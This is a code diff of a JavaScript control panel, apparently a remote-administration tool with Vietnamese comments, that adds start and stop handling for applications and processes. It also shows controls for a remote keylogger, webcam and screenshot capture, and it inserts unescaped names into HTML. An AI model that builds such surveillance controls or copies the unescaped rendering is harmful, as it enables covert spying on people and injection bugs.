@@ -113,7 +113,10 @@ function handleResponse(data) {
     // SỬA: Xử lý sự kiện "stopped" của Webcam
     else if (data.response === 'stopped') { 
         if(currentView === 'keylogger') document.getElementById('keylogger-status').textContent = "Trạng thái: Đã dừng.";
-        if(currentView === 'applications') sendCommand('app_list');
+        if(currentView === 'applications') sendCommand('app_list'); 
+        if(currentView === 'applications') {
+            setTimeout(() => sendCommand('app_list'), 200); 
+        }
         
         // QUAN TRỌNG: Dọn dẹp khung hình Webcam khi nhận lệnh dừng
         if(currentView === 'webcam') {
@@ -129,6 +132,13 @@ function handleResponse(data) {
                 placeholder.innerHTML = '<i class="fas fa-video-slash fa-2x mb-2 text-slate-400"></i><br>Webcam đang tắt';
             }
         }
+    }
+    else if (data.response === 'started') {
+        // QUAN TRỌNG: Khi nhận tin 'started' (đã mở app), tải lại danh sách
+        if(currentView === 'applications') {
+            setTimeout(() => sendCommand('app_list'), 500); // Delay 0.5s để app kịp hiện lên trong list process
+        }
+        if(currentView === 'processes') sendCommand('process_list');
     }
     else if (data.response === 'killed' && currentView === 'processes') sendCommand('process_list');
     else if (data.response === 'done' || data.response === 'ok') showModal("Thông báo", "Thao tác thành công.", null, true);
@@ -212,11 +222,19 @@ function renderAppLayout() {
 function updateAppTable(apps) {
     const tbody = document.getElementById('app-list-body');
     if(!apps.length) { tbody.innerHTML = '<tr><td colspan="3" class="p-4 text-center text-gray-500">Không có dữ liệu</td></tr>'; return; }
-    tbody.innerHTML = apps.map(a => `<tr><td class="px-6 py-4 text-sm font-medium">${a.name}</td><td class="px-6 py-4 text-xs text-gray-500 truncate max-w-xs">${a.path}</td><td class="px-6 py-4 text-center"><button data-id="${a.name}" class="stop-app-btn bg-red-50 text-red-600 px-3 py-1 rounded hover:bg-red-100"><i class="fas fa-times"></i> Đóng</button></td></tr>`).join('');
     
-    document.querySelectorAll('.stop-app-btn').forEach(btn => {
-        btn.onclick = () => sendCommand('app_stop', { name: btn.dataset.id });
-    });
+    tbody.innerHTML = apps.map(a => `
+        <tr class="hover:bg-slate-50 transition-colors">
+            <td class="px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-900">${a.name}</td>
+            <td class="px-6 py-4 whitespace-nowrap text-xs text-gray-500 truncate max-w-xs" title="${a.path}">${a.path}</td>
+            <td class="px-6 py-4 whitespace-nowrap text-center">
+                ${a.status === 'Running' 
+                    ? `<button data-action="stop-app" data-id="${a.name}" class="bg-red-50 text-red-600 px-3 py-1 rounded hover:bg-red-100 transition-colors"><i class="fas fa-stop-circle"></i> Đóng</button>`
+                    : `<button data-action="start-app" data-id="${a.path}" class="bg-green-50 text-green-600 px-3 py-1 rounded hover:bg-green-100 transition-colors"><i class="fas fa-play-circle"></i> Mở</button>`
+                }
+            </td>
+        </tr>
+    `).join('');
 }
 
 function renderProcessLayout() {
@@ -274,8 +292,50 @@ function switchView(view) {
     document.querySelector(`button[data-view="${view}"]`).classList.add('active');
     const area = document.getElementById('content-area');
     
-    if(view === 'applications') { area.innerHTML = renderAppLayout(); document.getElementById('list-apps-btn').onclick = refreshCurrentViewData; document.getElementById('start-app-btn').onclick = () => sendCommand('app_start', {name: document.getElementById('app-start-name').value}); refreshCurrentViewData(); }
-    else if(view === 'processes') { area.innerHTML = renderProcessLayout(); document.getElementById('list-proc-btn').onclick = refreshCurrentViewData; document.getElementById('start-process-btn').onclick = () => sendCommand('process_start', {name: document.getElementById('process-start-path').value}); refreshCurrentViewData(); }
+    if(view === 'applications') { 
+        area.innerHTML = renderAppLayout(); 
+        document.getElementById('list-apps-btn').onclick = refreshCurrentViewData; 
+        document.getElementById('start-app-btn').onclick = () => sendCommand('app_start', {name: document.getElementById('app-start-name').value});
+        
+        // SỬA LỖI TẮT/MỞ: Sử dụng Event Delegation để bắt sự kiện
+        document.getElementById('app-list-body').addEventListener('click', (e) => {
+            const stopBtn = e.target.closest('button[data-action="stop-app"]');
+            const startBtn = e.target.closest('button[data-action="start-app"]');
+            
+            if (stopBtn) {
+                const name = stopBtn.getAttribute('data-id');
+                showModal("Dừng Ứng Dụng", `Dừng ứng dụng "${name}"?`, () => {
+                    // Hiển thị spinner khi đã xác nhận
+                    stopBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
+                    sendCommand('app_stop', { name: name });
+                });
+            }
+            if (startBtn) {
+                const path = startBtn.getAttribute('data-id');
+                // Hiển thị spinner ngay lập tức vì không cần Modal
+                startBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
+                sendCommand('app_start', { name: path });
+            }
+        });
+        
+        refreshCurrentViewData(); 
+    }
+    else if(view === 'processes') { 
+        area.innerHTML = renderProcessLayout(); 
+        document.getElementById('list-proc-btn').onclick = refreshCurrentViewData; 
+        document.getElementById('start-process-btn').onclick = () => sendCommand('process_start', {name: document.getElementById('process-start-path').value}); 
+        
+        // Event Delegation cho Kill Process
+        document.getElementById('process-list-body').addEventListener('click', (e) => {
+            const btn = e.target.closest('button[data-action="kill-process"]');
+            if (btn) {
+                const pid = btn.getAttribute('data-id');
+                showModal("Kill Process", `Chấm dứt tiến trình PID ${pid}?`, () => sendCommand('process_stop', { pid: parseInt(pid) }));
+            }
+        });
+        
+        refreshCurrentViewData(); 
+    }
     else if(view === 'screenshot') { area.innerHTML = renderScreenshotView(); document.getElementById('capture-btn').onclick = () => {screenshotPending=true; document.getElementById('screenshot-image').style.display='none'; document.getElementById('screenshot-placeholder').style.display='block'; sendCommand('screenshot');}; document.getElementById('save-screenshot-btn').onclick = () => { const link = document.createElement('a'); link.href = document.getElementById('screenshot-image').src; link.download = prompt("Tên file:", "screenshot.png") || "screenshot.png"; link.click(); }; }
     else if(view === 'keylogger') { area.innerHTML = renderKeyloggerDisplay(); document.getElementById('start-key').onclick = () => sendCommand('keylogger_start'); document.getElementById('stop-key').onclick = () => sendCommand('keylogger_stop'); document.getElementById('clear-key').onclick = () => document.getElementById('keylogger-log').value = ''; }
     else if(view === 'webcam') { area.innerHTML = renderWebcamControl(); document.getElementById('cam-on').onclick = () => {sendCommand('webcam_on'); document.getElementById('webcam-placeholder').innerHTML = '<div class="loader mb-2"></div> Đang kết nối...';}; document.getElementById('cam-off').onclick = () => sendCommand('webcam_off'); }
@@ -528,7 +588,6 @@ function updateAppTable(apps) {
     document.querySelectorAll('button[data-action="stop-app"]').forEach(btn => {
         btn.onclick = () => {
             btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
-            sendCommand('app_stop', { name: btn.dataset.id });
         };
     });
 }
